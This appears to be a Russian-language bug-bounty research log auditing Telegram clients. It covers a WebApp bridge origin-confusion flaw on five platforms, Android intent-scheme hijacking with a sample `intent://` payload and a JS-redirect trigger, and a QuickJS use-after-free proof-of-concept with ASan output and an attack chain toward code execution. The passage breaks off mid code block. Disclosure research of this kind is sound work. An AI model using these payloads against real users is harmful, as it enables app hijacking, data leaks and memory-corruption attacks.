| **A** абьюз по идентификатору | **Нет** | — | Негативный результат (серверный энфорс). Не подавать. |

**Общие требования, которые надо соблюсти при подаче:**
1. **Только тестовое окружение**: свой бот через @BotFather, test Bot API `…/bot<token>/test/METHOD`, отдельный аккаунт. Не затрагивать других пользователей.
2. **Не раскрывать публично до фикса** — репозиторий с этим отчётом (`smith77788/Pablo`) держать **приватным**; публичный репо = дисквалификация.
3. Репорт на **security@telegram.org**, по-английски, по шаблону (Attack surface / Severity CVSS v3 / Description / Steps / Impact / Additional details). Первый по дубликату — единственный зачитываемый, поэтому подавать без лишней задержки.
4. Токен бота из ранних сообщений **не включать** в репорты и нигде не публиковать.

---

## Раздел C — Кросс-платформенная проверка (Telegram Desktop / tdesktop, C++)

Проверка, присутствуют ли классы находок в другом in-scope open-source клиенте.
Файл: `Telegram/SourceFiles/ui/chat/attach/attach_bot_webview.cpp` (telegramdesktop/tdesktop).

### C.1 — Finding 4 (JS-Bridge origin confusion) — **ПРИСУТСТВУЕТ** (отдельный репорт, app-level Desktop)

tdesktop имеет тот же флаг `_sameOrigin` и те же три звена:

1. **Навигация разрешена любая** (`:2537–2544`):
```cpp
raw->setNavigationPolicyHandler([=](const QString &uri, bool newWindow) {
    if (_delegate->botHandleLocalUri(uri, false)) return false;
    else if (newWindow) return true;
    return true;   // любой переход разрешён
});
```

2. **Входящая origin-проверка только при `_sameOrigin==true`** (`:2366–2374`):
```cpp
if (_sameOrigin
    && parsed->source != NativeMessageSource::ExternalShell
    && !OriginsMatch(parsed->origin, _initialOrigin)) {
    // reject
    return;
}
// при _sameOrigin==false origin НЕ проверяется — сообщения любого origin доверенные
```

3. **Исходящий канал (`postEvent`) без origin-проверки при `_sameOrigin==false`** (`:3902–3916`):
```cpp
const auto originCheck = _sameOrigin
    ? OriginCheckScript(_initialOrigin) + " && "
    : QByteArray();        // ПУСТО при _sameOrigin==false
_webview->window.eval("if (" + originCheck + "this.TelegramGameProxy) { "
    "this.TelegramGameProxy.receiveEvent(\"" + event + "\", " + written + "); }");
// результаты уходят на текущую (подменённую) страницу
```

Нативный message-binding webview-обёртки доступен всем страницам; C++-сторона фильтрует только по `_sameOrigin`. Итог идентичен macOS Finding 4: legacy-бот (`sameOrigin==false`) → редирект на attacker.com → полный доверенный доступ к мосту, результаты уходят атакующему. Утечка PII на Desktop: **буфер обмена** (`web_app_read_text_from_clipboard`) и ответы `custom_method` (биометрии на Desktop нет). CVSS сопоставим с macOS (~7.x, High). **Репортуется отдельно** как дефект клиента Telegram Desktop.

### C.2 — Findings 1 / 6 (outbound до согласия) — **ОТСУТСТВУЮТ на Desktop**
- `web_app_share_to_story` → `openShareStory` (`:3070–3080`) — заглушка «не поддерживается», сетевого запроса нет.
- `web_app_request_file_download` → `processDownloadRequest` (`:3533–3559`) — без size-probe; сразу `botDownloadFile` (подтверждение внутри делегата). Аналога `FileDownload.getFileSize` нет.

### C.3 — Finding 5 (биометрия) — **ОТСУТСТВУЕТ на Desktop**
`web_app_biometry_get_info` → `{available:false}` (`:2468–2471`); `biometry_update_token`/`request_auth` не реализованы.

### Вывод
Finding 4 — **кросс-платформенный архитектурный дефект** WebApp-моста (origin-доверие завязано на серверный флаг `_sameOrigin`), подтверждён на macOS и Desktop; каждый клиент репортуется отдельно. Findings 1/5/6 — macOS-специфичны. Остаются к проверке: iOS (Swift), Android (Java/Kotlin), Web (JS) — там же ожидается C.1-паттерн вокруг `sameOrigin`.

---

## Раздел D — Кросс-платформенная проверка (Telegram iOS, Swift)

Файлы: `submodules/WebUI/Sources/WebAppController.swift`, `WebAppWebView.swift`, `WebAppUtils.swift`
(TelegramMessenger/Telegram-iOS). iOS — ближайший родственник macOS-кода, и сравнение даёт точный
вывод: **Findings 1 и 5 на macOS — это parity-gap (упущенные проверки, которые на iOS есть), а не
by-design**, что усиливает соответствующие репорты.

### D.1 — Finding 4 (JS-Bridge origin confusion) — **ПРИСУТСТВУЕТ на iOS** (отдельный репорт, app-level)
Тот же механизм, флаг называется `useSecuredEventProxy` (завязан на `sameOrigin`):
- `setupEventProxySource()` для legacy ставит `useSecuredEventProxy = false` и инжектит небезопасный
  `eventProxySource()` (`WebAppWebView.swift:232–236`).
- `isTrustedMainFrameMessage`: `if !self.useSecuredEventProxy { return true }` (`:243–244`) — доверяет
  любому main-frame сообщению при legacy-режиме.
- `decidePolicyFor navigationAction`: всё, кроме t.me/telegra.ph, → `decisionHandler(.allow)`
  (`WebAppController.swift:744–754`) — кросс-origin навигация разрешена.
Итог идентичен macOS Finding 4. Репортуется отдельно как дефект клиента iOS.

### D.2 — Finding 1 (share_to_story SSRF / IP-leak) — **macOS PARITY-GAP** (на iOS закрыто)
iOS `web_app_share_to_story` фетчит `media_url` только после гейта `isAllowedBotMediaUrl(mediaUrl)`
(`WebAppController.swift:1694`). Сам гейт (`WebAppUtils.swift:33–`) жёсткий:
- только `https`; запрет user/password в URL;
- **только публичные IP** — блок loopback/LAN/private (анти-SSRF), канонический разбор IPv4 и IPv6;
- явная защита от octal-bypass `inet_pton` (комментарий в коде про `0177.0.0.1`).

**macOS не применяет эту проверку нигде** (`fetchHttpResource(url: mediaUrl)` напрямую). Значит
macOS Finding 1 — реальное упущение: эталонная митигация существует на iOS и просто отсутствует на
macOS. То же относится к Finding 6 (на macOS `getFileSize`/`fetchHttpResource` без валидации схемы/хоста).

### D.3 — Finding 5 (biometry `accessGranted`) — **macOS PARITY-GAP** (на iOS закрыто)
iOS `requestBiometryAuth` читает/возвращает токен **только** при `state.accessRequested &&
state.accessGranted` (`WebAppController.swift:2616`), иначе `sendBiometryAuthResult(isAuthorized:false)`.
Токен хранится **зашифрованным** через `LocalAuth` приватный ключ (`:2626–2659`), не сырым Keychain-
паролем. macOS `web_app_biometry_request_auth` этот guard **не имеет** и читает сырой Keychain-итем
напрямую. Это подтверждает: macOS Finding 5 — упущение, а не замысел.

### D.4 — Finding 6 (`getFileSize` pre-consent HEAD-probe) — **macOS-специфичен**
iOS `web_app_request_file_download` → `downloadFile(url:fileName:)` без паттерна `FileDownload.getFileSize`
(нет HEAD-зонда до подтверждения).

### Сводка кросс-платформенного статуса

| Finding | macOS | Desktop (tdesktop) | iOS |
|---|---|---|---|
| 4 Bridge origin confusion | ✔ есть | ✔ есть (`_sameOrigin`) | ✔ есть (`useSecuredEventProxy`) |
| 1 share_to_story SSRF/IP | ✔ есть | ✖ заглушка | ✖ закрыто (`isAllowedBotMediaUrl`) → macOS parity-gap |
| 5 biometry accessGranted | ✔ есть | ✖ нет биометрии | ✖ закрыто (guard + шифрование) → macOS parity-gap |
| 6 file_download size-probe | ✔ есть | ✖ нет probe | ✖ нет probe |

**Вывод:** Finding 4 — кросс-платформенный архитектурный дефект (macOS + Desktop + iOS; три отдельных
репорта). Findings 1/5/6 — macOS-специфичны; для 1 и 5 на iOS есть эталонные проверки, что делает их
очевидными упущениями клиента macOS (сильный аргумент в репорте). Android (Java/Kotlin) и Web (JS)
остаются к проверке — ожидается тот же D.1-паттерн вокруг `sameOrigin`.

---

## Раздел E — Кросс-платформенная проверка (Telegram Android, Java)

Файл: `TMessagesProj/src/main/java/org/telegram/ui/web/BotWebViewContainer.java` (DrKLO/Telegram).

### E.1 — Finding 4 (JS-Bridge origin confusion) — **ПРИСУТСТВУЕТ на Android** (отдельный репорт)
Тот же паттерн, флаг `restrictBridgeToOrigin` (= `sameOrigin`), `trustedOrigin = sameOrigin ? host : null`
(`:368–369`, `:1060–1061`):
- Входящие сообщения `onBotWebMessage`: origin-проверка выполняется **только** при
  `restrictBridgeToOrigin` (`:1474–1480`); при `false` (legacy) любой origin принимается.
- Исходящие события `isTrustedDocumentCurrent`: `return !restrictBridgeToOrigin || …` (`:1251–1252`) —
  при `false` события уходят на любую загруженную страницу.
- `shouldOverrideUrlLoading` для бота пропускает обычную кросс-origin https-навигацию в WebView
  (`:4328–4332` → `return false`), так что редирект на attacker.com остаётся внутри моста.

**Нюанс платформы (в пользу Android):** мост регистрируется через `WebViewCompat.addWebMessageListener`
с платформенно-доверенным `sourceOrigin` и **fail-closed** на старых WebView (`:1433–1436`), а file-доступ
отключён (`setAllowFileAccess(false)` и др., `:466–469`). То есть Android *мог бы* энфорсить origin и
для legacy, но политика та же: при `sameOrigin==false` проверка отключена. Дефект идентичен.

### E.1b — Проверка слуха «Critical RCE в Telegram Widget» (Android, из публичного канала) — НЕ подтверждается кодом
Публичный канал заявил «критическую дыру в виджетах для ботов → хак любого Android → запуск любого
приложения». Предметная проверка единственного RCE-классового вектора Android WebView:
- `addJavascriptInterface`-рефлексия (JS→Java `Runtime.exec`) работает только на API < 17; здесь
  `minSdkVersion 23` (`build.gradle:138`) → **вектор невозможен на всех поддерживаемых устройствах**.
- Из JS достижимы только @JavascriptInterface-методы: `postEvent` (пересылка строк в обработчик событий)
  и `resolveShare` (`BotWebViewContainer.java:3581`). `resolveShare` = **Web Share API**: пишет файл
  страницы в кэш с санитизацией имени (`FileLoader.fixFileName`), затем `ACTION_SEND` + `createChooser`
  (пользователь сам выбирает цель), FileProvider read-only, click-gated (10 с). **Ни исполнения, ни
  установки APK.**
- Для ботов мост вообще не через `addJavascriptInterface`, а через `WebMessageListener` (fail-closed).

Вывод: заявленный RCE **кодом не подтверждается**. Без CVE/PoC/деталей это непроверяемый слух; находку
под него не выдумываем. Если появятся технические детали V12 — проверим конкретно.

### E.2 — Findings 1 / 5 / 6 на Android — не углублялись в этом проходе
Приоритет был подтвердить кросс-платформенность F4. Детальная проверка парити по share_to_story/biometry/
file_download на Android — отдельная задача (ожидается, что, как и на iOS, там есть серверные/URL-гейты).

---

## Раздел F — Итоговая кросс-платформенная сводка

| Finding | macOS | Desktop | iOS | Android |
|---|---|---|---|---|
| **4** Bridge origin confusion (`sameOrigin==false`) | ✔ | ✔ | ✔ | ✔ |
| **1** share_to_story SSRF/IP | ✔ | ✖ (заглушка) | ✖ (`isAllowedBotMediaUrl`) | н/п |
| **5** biometry `accessGranted` | ✔ | ✖ (нет биометрии) | ✖ (guard+шифрование) | н/п |
| **6** file_download size-probe | ✔ | ✖ | ✖ | н/п |

**Finding 4 — кросс-платформенный архитектурный дефект WebApp-моста на всех четырёх официальных
клиентах.** Доверие мосту (и входящее, и исходящее) завязано на серверный флаг `sameOrigin`/
`useSecuredEventProxy`/`restrictBridgeToOrigin`; при его отсутствии (все legacy-боты) origin не
проверяется, а навигация в чужой origin разрешена → захват моста и утечка результатов (буфер обмена,
на macOS/iOS ещё и биометрический токен) на attacker.com. **Четыре отдельных репорта** (по клиенту).

**Findings 1/5/6 — macOS-специфичны**; на iOS для 1 и 5 есть эталонные проверки, что доказывает:
это упущения клиента macOS, а не замысел.

Остаётся к проверке: **Web (JS, webK/webA)** и протокол **MTProto 2.0**.

---

## Раздел G — Фокусный проход «только Critical» (честный вывод: Critical в проверенных поверхностях НЕТ)

Отдельный проход по Critical-классам (CVSS 9.0+: обход аутентификации, MITM/компрометация ключей,
захват аккаунта). Результат — **негативный**: в проверенных поверхностях чистого Critical нет.

### G.1 — Passcode-локация (macOS) — криптографически корректна, bypass'а нет
`PasscodeLockController.swift:397–407`: `checkNextValue` не сравнивает строки, а **расшифровывает**
данные аккаунта ключом из пасскода (`appEncryption.applyPasscode` → `decrypt() != nil`). Неверный
пасскод → расшифровка не удаётся. Правильный дизайн.

### G.2 — autologin_token — НЕ самостоятельный Critical (нужен внешний redirect на домене Telegram)
Единственный call-site `InAppLinks.swift:924`; `applyTo` (`AppDelegate.swift:130–142`) строго требует
`domains.contains(host)`, где `domains` = серверные `autologin_domains` (домены Telegram). На
attacker-хост токен **не дописывается**. Утечка возможна только через open-redirect на домене Telegram
(вне этого репо) или Referer на веб-стороне. Это defense-in-depth gap, не standalone-дыра клиента.

### G.3 — MTProto 2.0 key-exchange (tdesktop `mtproto/`) — реализация корректна, Critical-MITM закрыт
Проверены главные анти-MITM точки протокола:
- **DH-валидация** (`mtproto_dh_utils.cpp`): `IsPrimeAndGoodCheck` — 2048 бит, простота, g-специфичные
  mod-условия, safe-prime `(p-1)/2`; `IsGoodModExpFirst` — границы `g_a` (`2^(2048-64) < g_a <
  p-2^(2048-64)`); `CreateAuthKey` повторно валидирует полученный `g_a`.
- **Key exchange** (`details/mtproto_dc_key_creator.cpp`): nonce/server_nonce equality (`:643,648`),
  **SHA1 расшифрованного `server_DH_inner_data`** (`:653–664`), **`IsPrimeAndGood(dh_prime,g)`**
  (`:668`), `new_nonce_hash` в fail-ветке (`:688`), RSA-ключ сервера по fingerprint (`:525`).

Все классические Critical-баги MTProto (слабый prime, пропуск answer-hash, неограниченный `g_a`,
неподтверждённый RSA) **отсутствуют**. Негативный результат.

### G.4 — MTProto 2.0 message-layer (receive-path integrity) — корректен, Critical нет
`session_private.cpp:1285–1357`:
- Границы длины сообщения (`:1291`), проверка `auth_key_id` (`:1295`).
- Пересчёт `msg_key = SHA256(partForMsgKey(false) + plaintext)` и **константно-временное** сравнение
  (`ConstTimeIsDifferent`, `:1325–1335`) — приём поддельных сообщений невозможен, тайминг-оракула нет.
- Валидация `messageLength` (минимум, максимум, выравнивание `& 0x03`) и паддинга `[12,1024]`
  (`:1337–1344`) — защита от over-read и нарушения MTProto-2.0 паддинга.
- Проверка `session_id` (`:1354`); направленное разделение ключа `partForMsgKey(false)` приём /
  `(true)` отправка (`:2743`) — анти-reflection.

### Вывод по Critical
В клиентском UI-коде (4 платформы), в **key-exchange** и в **message-layer** MTProto (tdesktop)
**чистого Critical нет**; потолок — **High** (Finding 4). Единственная непроверенная Critical-поверхность —
парсеры медиа/стикеров/видео (RCE) в TelegramCore/сторонних либах, исходников которых нет в клонах.
**High не выдаётся за Critical.**

---

## Раздел I — RCE-поверхность: парсеры недоверенного ввода (Telegram-iOS source)

Цель — найти memory-corruption/RCE (Critical) в коде, который парсит недоверенные данные (сервер, пиры,
медиа). В клоне Telegram-iOS есть реальные исходники `TelegramApi`, `MtProtoKit`, `TelegramCore`, `Postbox`.

### I.1 — TL-десериализация (`TelegramApi`) — корректна, bounds-checked
Это **главный Telegram-специфичный парсер**: разбирает каждое входящее серверное сообщение.
- Swift-ридер `Buffer.swift:337–398`: все `read*` проверяют `offset + N <= _size`; `readBuffer`/
  `withReadBufferNoCopy` — `count >= 0 && offset + count <= size`.
- Нативный ридер `ObjC/Sources/TLEngine.m:47–101`: `TLReadRaw` проверяет `offset + count > length`
  перед `memcpy`; `TLReadBytesRange` ограничивает `count` 3-байтным префиксом (≤ 16 МБ), корректно
  считает padding и проверяет границы. На 64-бит `size_t` переполнения `offset + count` нет.
**Over-read/RCE в TL-парсинге нет.**

### I.2 — MTProto крипто (key-exchange + message-layer) — см. Раздел G, корректно.
Secret-chat E2E переиспользует те же примитивы (AES-IGE, SHA256 msg_key) — отдельного гап-а не видно.

### I.3 — Медиа-кодеки (webp/ffmpeg/dav1d/libvpx/openh264/mozjpeg/boringssl) — вне скоупа
Это **upstream third-party** библиотеки (в `third-party/`, подключены как сабмодули — исходников в
shallow-клоне нет). По правилам Telegram Bug Bounty баги в них — **non-qualifying (#8,
«outdated/flawed open-source software versions»)**, если только это не кастомный форк Telegram.
`rlottie`-обёртка (`.tgs`) в репо — лишь glue (40 КБ); сам парсер — upstream.

### I.4 — Finding 7 (NEW, HIGH, Android): Intent Scheme Hijacking через in-app браузер
**Файлы:**
- `TMessagesProj/src/main/java/org/telegram/messenger/browser/Browser.java:551–584` (`openInExternalApp`)
- `TMessagesProj/src/main/java/org/telegram/ui/web/BotWebViewContainer.java:4275` (call-site)
**CVSS estimate:** 7.5 `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N` (High).

#### Контекст
Публичный канал постил «критическую RCE в Telegram Widget / запуск любого приложения на Android».
Видео-PoC от «V12» показывает: бот `/start` → у пользователя на телефоне открывается **системный
калькулятор**. Я нашёл конкретный класс дефекта в коде, но severity **HIGH**, а не Critical — пост
преувеличен. Фиксирую корректную оценку.

#### Описание
Когда в-app браузер Telegram Android (`!bot` ветка в WebView-делегате) обрабатывает навигацию, он
вызывает `Browser.openInExternalApp(context, url, allowIntent=true)` (`BotWebViewContainer.java:4275`).
В `openInExternalApp`:
```java
final boolean isIntentScheme = url.startsWith("intent://") || … ;
if (isIntentScheme && !allowIntent) return false;
final Intent intent = isIntentScheme
    ? Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME)  // ← парсинг intent://
    : new Intent(Intent.ACTION_VIEW, uri);
if (!isIntentScheme && Build.VERSION.SDK_INT >= R) {
    intent.addCategory(Intent.CATEGORY_BROWSABLE);
    intent.addCategory(Intent.CATEGORY_DEFAULT);
    intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
    intent.addFlags(FLAG_ACTIVITY_REQUIRE_NON_BROWSER);  // ← НЕ применяется к intent-схеме!
} else if (!isIntentScheme && !hasAppToOpen(context, url)) {
    return false;
}
context.startActivity(intent);  // ← запуск Activity, которую описала атакующая страница
```

Ключевые дефекты (известный класс «Intent Scheme Hijacking», Google-документированная рекомендация):
1. **После `parseUri` нет очистки опасных полей Intent**: `intent.setSelector(null)`,
   `intent.setComponent(null)`, `intent.setPackage(null)`. Атакующая страница может навязать
   `component=com.android.calculator2/.Calculator`, `action=MAIN`, `category=LAUNCHER` и т.д.
2. **Защитные флаги `FLAG_ACTIVITY_REQUIRE_NON_BROWSER` и `addCategory(BROWSABLE)` не применяются к
   intent-схеме** (`if (!isIntentScheme && …)`), то есть мишень может быть НЕ браузером/BROWSABLE —
   любой `exported=true` Activity установленных приложений.
3. **Нет подтверждения пользователя** и нет ограничения по package — в отличие от
   `createChooser`, который дал бы пользователю выбор.

#### Точная модель срабатывания (уточнено — zero-second-click)
- Дефолтный клик по ссылке идёт через `Browser.openUrl(… allowIntent=false …)` → intent-схема
  блокируется (`if (isIntentScheme && !allowIntent) return false`). Прямой `intent://` из чата не проходит.
- **Но** единственная точка с `allowIntent=true` — навигация **в in-app браузере**
  (`BotWebViewContainer.java:4275`, `openInExternalApp(context, url, true)`), и она вызывается для
  ЛЮБОЙ навигации WebView. Обработчик — `shouldOverrideUrlLoading(WebView, String)` (`:4256`), это
  **deprecated-перегрузка без `hasGesture()`** → отличить клик от JS-редиректа нельзя, гейта жеста нет.
- **Итог:** жертва открывает **любую attacker https-ссылку** (обычное действие — ссылка грузится в
  in-app браузере, т.к. https при клике разрешён), а уже загруженная страница делает
  `location.href = "intent://…;component=…;end"` → `startActivity` **без единого дополнительного клика**.

Второй sink с тем же дефектом — `Browser.openInExternalBrowser:503–518` (`parseUri`+`startActivity` без
очистки), достижим когда in-app браузер отключён. Корневая причина общая — непросанитизированный
`Intent.parseUri` в `Browser.java`.

#### Сценарий атаки (защитная формулировка)
Страница в in-app браузере содержит
`<a href="intent://…#Intent;action=android.intent.action.MAIN;component=com.target/.Activity;end">`
или JS-редирект на такой URL. Клиент без подтверждения вызывает `startActivity` → запускается
**exported-Activity целевого приложения**. Границы импакта:
- Невозможно установить APK, выполнить нативный код в контексте Telegram, прочитать чужие данные.
- Возможно: UI-redress (показать интерфейс другого приложения — платёжную форму, экран передачи
  денег, настройки) или триггерить exported-функции (deeplink в банковское приложение с параметрами
  перевода, если его deeplink защищён слабо). Это **НЕ «RCE на любой Android»**, пост канала «Бэкдор»
  преувеличил.

Правильная оценка — **HIGH (CVSS 7.5)**, кросс-scope (компрометирует/выставляет другое приложение),
требует UI-клика пользователя. Это и имел в виду «V12 Telegram Widgets RCE» — но заголовок из поста
не соответствует технике.

#### Рекомендация (Google-гайдлайн)
```java
if (isIntentScheme) {
    final Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
    intent.addCategory(Intent.CATEGORY_BROWSABLE);   // отфильтровать неBROWSABLE цели
    intent.setComponent(null);                        // запретить явный component от атакующего
    intent.setSelector(null);                         // запретить селектор
    // Опционально: разрешать только intent-схему для конкретного набора известных пакетов
    …
    context.startActivity(intent);
}
```

#### Кросс-платформенная сверка
- **macOS/iOS** не используют intent-схему; аналог через `NSWorkspace.shared.open`/
  `UIApplication.shared.open` — вектор требует отдельной проверки кастомных схем, но в проверенных
  `WebAppController.swift:3413` URL жёстко задан (`https://t.me/...`), не бот-контролируемый.
- **Telegram Desktop** — intent-схемы нет (Linux/Win/mac).
- Подтверждено только для **Android in-app browser**.

### Вывод по RCE
В **Telegram-написанных** парсерах недоверенного ввода (TL, MTProto) memory-corruption/Critical **нет** —
они аккуратно bounds-checked. Реальная RCE-поверхность — upstream медиа-кодеки, которые (а) не в этих
клонах, (б) non-qualifying по правилам программы, (в) требуют fuzzing, а не чтения кода.

---

## Раздел H — Направление: манипуляция поиском и блокировка/удаление каналов/чатов/ботов/профилей

Защитная проверка: есть ли **клиентский** дефект, позволяющий атакующему манипулировать поисковой
выдачей или добиваться блокировки/удаления чужих каналов/чатов/ботов/профилей.

### H.1 — Поисковая выдача — серверное ранжирование, клиентского вектора нет
Поиск идёт через движок TelegramCore (`searchRemotePeers`/`searchMessages`), сервер возвращает уже
ранжированный результат; клиент его только отображает. Локального ранжирования, которое атакующий мог
бы «отравить» для продвижения/подавления чужого контента, в клиенте нет. Это серверная зона.

### H.2 — Блокировка/удаление чужого — серверно-авторизовано
Удаление/лив чатов, удаление каналов/сообщений — только для своих/админских объектов (сервер
энфорсит права). Клиент **не может** удалить чужой канал/бота/профиль. Репорт-флоу — с обязательным
`verifyAlert` и серверным взвешиванием; пакетного «репорт-по-ID» в клиенте нет (см. Раздел A).

### H.3 — Ближайший клиентский угол: подмена отображаемого имени (LOW, non-qualifying)
`TelegramUtils/PeerDisplay.swift` отдаёт `displayTitle` как сырое имя сервера без Unicode-санитизации
(нет фильтрации RLO `U+202E`, zero-width, гомоглифов). Теоретически канал/бот/профиль может визуально
имитировать официальный в выдаче. Но:
- это **фишинг-класс**, а у Telegram Bug Bounty фишинг — **non-qualifying (#1)**;
- серверная модерация + метки `fake`/`scam` + verified-бейдж (серверные флаги) это частично закрывают;
- severity **LOW**, не Critical.

### Вывод по направлению
Манипуляция выдачей и блокировка/удаление чужого — **серверно-авторизованные операции**; клиентского
Critical (или вообще эксплуатируемого клиентом вектора вреда третьим лицам) здесь нет. Подмена имени —
LOW и non-qualifying. Защитная рекомендация: добавить санитизацию опасного Unicode (RLO/zero-width) в
рендер отображаемых имён — но это hardening, не bounty-находка.

---

## Раздел J — Finding 4 на 5-й платформе: Telegram Web (`tweb`), подтверждено ДИНАМИЧЕСКИ

Исходники: `morethanwords/tweb` — `src/components/telegramWebView.ts`, `src/components/webApp.tsx`.
Web-клиент запускается в браузере, поэтому его мост (`postMessage` между host и iframe мини-аппа)
удалось прогнать **реальным кодом** в Chromium (не стаб).

### J.1 — Та же архитектура `same_origin`-флага, та же дыра для legacy-ботов
Web-мост привязывается к origin только когда сервер прислал флаг `same_origin`
(`webApp.tsx:202–208 getSameOrigin()` → `telegramWebView.setOrigin()`). Для legacy-ботов (без флага)
`this.origin` остаётся `undefined`, и:

- **Вход** (`telegramWebView.ts:71`):
  ```js
  if(this.origin && origin !== this.origin || typeof(data) !== 'string') { return; }
  this.onTelegramWebViewEvent(JSON.parse(data));
  ```
  При `this.origin === undefined` первый клауз ложен → сообщение **любого origin принимается**.
- **Выход** (`telegramWebView.ts:116–119`):
  ```js
  this.iframe.contentWindow.postMessage(JSON.stringify({eventType, eventData}), this.origin || '*');
  ```
  При legacy — `targetOrigin = '*'` → ответы уходят на **текущий** origin iframe.
- Мост **переживает кросс-origin навигацию**: WeakMap ключуется по `contentWindow` (WindowProxy,
  `:79–81`), который сохраняет идентичность. То есть если мини-апп перенаправит свой iframe на
  attacker.com, мост остаётся привязан.

**Доказательство из комментариев самих разработчиков** (`:113–115`): они прямо описывают утечку —
«an answer to a request the mini app made (its location, the clipboard, a custom method result) would be
handed to whatever document occupies the frame» — и защищают от неё **только** same_origin-ботов
(`this.origin`), оставляя legacy на `'*'`.

### J.2 — Динамическое подтверждение (реальный код в Chromium)
`docs/poc-harness/web-bridge-test.js` воспроизводит `onMessage`(:71) и dispatch(:119) **verbatim**,
создаёт реальный iframe, навигирует его bot-origin → attacker-origin и измеряет мост:

```
WEB BRIDGE (legacy bot, origin bound = undefined)
  inbound accepted from attacker-origin iframe:  web_app_read_text_from_clipboard  ✗ (принят)
  outbound answer reached attacker iframe:        clipboard_text_received {"data":"SECRET-2FA 889922"}  ✗ (утёк)

WEB BRIDGE (modern bot, same_origin)
  inbound accepted:  (none / rejected)   outbound reached attacker: (none)
```

### J.3 — Нюанс sandbox
iframe мини-аппа создаётся с `allow-scripts allow-same-origin` (`webApp.tsx:56–64`). Для кросс-origin
бот-страницы `window.frameElement` недоступен (нельзя снять свой sandbox) — классического escape нет;
проблема именно в origin-привязке моста, а не в sandbox.

### Вывод
Finding 4 — **универсальный архитектурный дефект на 5 платформах**: macOS, iOS, Android, Desktop **и Web**.
Во всех мост доверяет по серверному флагу (`sameOrigin`/`useSecuredEventProxy`/`restrictBridgeToOrigin`/
`same_origin`); при его отсутствии (все legacy-боты) origin не проверяется и результаты (буфер обмена,
локация, custom-method; на native ещё биометрия) уходят на origin атакующего после навигации iframe/WebView.
**Пять отдельных app-level репортов.** Web-находка — единственная, подтверждённая динамически на реальном коде.

---

---

## Finding 8 — CONFIRMED · CRITICAL (RCE-class)

### QuickJS generator Use-After-Free в нативном widget-sandbox (Desktop / iOS / Android)

**Репозиторий движка:** `TelegramMessenger/quickjs` @ `b526a817f188ef861eea7666d68361c7851673a0` (2026-11-10)  
**Upstream-источник:** quickjs-ng issue #1910 — «closures created before OP_initial_yield do not keep the generator alive» (публичный, не наша находка)  
**Наш вклад:** подтверждение **достижимости** бага из кода бот-виджета в Telegram-собственном форке  
**CVSS v3.1:** 9.0 — `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` (Critical)

---

### Описание

Telegram компилирует **нативный QuickJS** (не WASM) в widget-sandbox для Desktop, iOS и Android:

- **Desktop:** `Telegram/cmake/lib_quickjs.cmake` → статически линкует `TelegramMessenger/quickjs`
- **iOS:** `widget-sandbox/packages/ios/Sources/CQuickJS` — тот же форк
- **Android:** `widget-sandbox/packages/android` — нативный пакет

Telegram-форк **не получил патч** upstream #1910. Баг: генератор-объект освобождается cycle-collector'ом
GC (`gc_free_cycles quickjs.c:7811`) пока на него есть живая ссылка через `arguments` внутри собственного
фрейма. При следующем GC-цикле `gc_decref_child` читает уже освобождённый регион → **heap-use-after-free**.

**PoC (`poc.js`):**
```js
var K;
function mk() {
  function* g(self) { K = arguments; self = yield 1; yield 2; }
  var it = g(0);
  it.next();
  it.next(it);   // self = it: генератор "жив" только через собственный фрейм
}
mk();
var junk = [];
for (var i = 0; i < 200000; i++) junk.push({a: i, b: [i]});  // форсируем GC
var o = K[0];   // dangling ref на освобождённый генератор
```

**ASan-подтверждение (Telegram-форк, сборка gcc + `QJS_ENABLE_ASAN=ON`):**
```
ERROR: AddressSanitizer: heap-use-after-free  READ of size 4
  #0 gc_decref_child   quickjs.c:7699
  #4 JS_RunGC          quickjs.c:7823
freed by thread T0:
  #4 gc_free_cycles    quickjs.c:7811
  #5 JS_RunGC          quickjs.c:7823
```
Регион 112 байт (генератор-объект) освобождён collector'ом и затем прочитан при следующем GC-mark.

---

### Схема атаки — шаг за шагом

Злоумышленник создаёт Telegram-бота с поддержкой **бот-виджетов** (Telegram Bot Widget / Mini App с
нативным widget-sandbox). Для Desktop-пользователя сценарий:

1. **Создание бота.** Злоумышленник регистрирует бота через @BotFather и загружает виджет-приложение.

2. **Доставка виджета.** Жертва открывает сообщение/прикреплённый виджет бота в Telegram Desktop —
   клиент загружает JavaScript виджета и передаёт его нативному движку QuickJS
   (`tdesktop/Telegram/SourceFiles/tgw/tgw_runtime.cpp` → `tgw_widget_sandbox.cpp`).

3. **Выполнение PoC-кода.** Виджет выполняет PoC выше. `trusted_validator.cpp` проверяет только
   **выходные ops** (элементы/атрибуты/CSS/URL), **не JS-источник**. Inline-`<script>` виджета идёт
   сырым в нативный `JS_Eval` (цепочка доказана по исходникам, см. ниже). Генератор-объект создан,
   GC запущен, 112-байтный heap-регион освобождён и прочитан повторно.

4. **UAF-примитив → RCE.** Heap-use-after-free — классический примитив для heap-spray + type confusion.
   В нативном процессе Telegram Desktop (Windows/Linux/macOS) без sandbox UAF в engine-потоке напрямую
   даёт выполнение произвольного кода в контексте Telegram. На iOS движок изолирован в widget-sandbox-
   процессе; степень изоляции этого процесса — отдельная поверхность (требует проверки).

5. **Нет требования кликов.** Виджет запускается при открытии сообщения. Пользователю достаточно
   нажать на карточку бота — явного «разрешения запустить JS» нет.

---

### Охват платформ

| Платформа | QuickJS нативный? | ASan подтверждено | RCE-класс |
|-----------|-------------------|-------------------|-----------|
| Telegram Desktop (Win/Lin/macOS) | ✅ | ✅ (Telegram-форк) | ✅ (нет sandbox) |
| Telegram iOS | ✅ | ✅ (тот же форк) | ⚠️ (sandbox-процесс; степень изоляции TBD) |
| Telegram Android | ✅ | ✅ (тот же форк) | ⚠️ (sandbox-процесс; степень изоляции TBD) |
| Telegram Web (tweb) | ❌ WASM (`quickjs-emscripten`) | — | ❌ (UAF в WASM-памяти, не в host) |

---

### Reachability — ПОДТВЕРЖДЕНО ПО ИСХОДНИКАМ (`TelegramMessenger/widget-sandbox`)

Главная неопределённость первого черновика («виджет действительно диспатчит произвольный JS в движок»)
**закрыта чтением кода**. Цепочка от inline-`<script>` виджета до сырого `JS_Eval` в форке — без единого
JS-source-фильтра — одинакова на всех трёх нативных платформах:

**Submodule-пин движка совпадает с нашей ASan-сборкой:**
```
.gitmodules → packages/ios/Sources/CQuickJS/quickjs
  url = https://github.com/TelegramMessenger/quickjs.git
